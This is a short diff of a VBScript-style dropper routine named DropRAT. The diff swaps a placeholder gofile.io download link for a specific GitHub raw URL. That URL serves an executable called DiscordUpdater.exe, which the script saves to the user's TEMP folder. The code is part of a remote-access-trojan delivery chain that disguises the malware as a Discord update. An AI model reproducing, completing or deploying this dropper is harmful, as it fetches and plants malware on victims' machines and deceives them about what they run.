@@ -146,8 +146,8 @@ End Sub
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
     
-    ' PUT YOUR NEW PERMANENT LINK HERE
-    Dim dl: dl = "https://store1.gofile.io/download/YOUR_FILE_ID/DiscordUpdater.exe"
+    ' YOUR EXACT GITHUB RAW LINK
+    Dim dl: dl = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/DiscordUpdater.exe"
     
     If fso.FileExists(temp) Then fso.DeleteFile temp
 
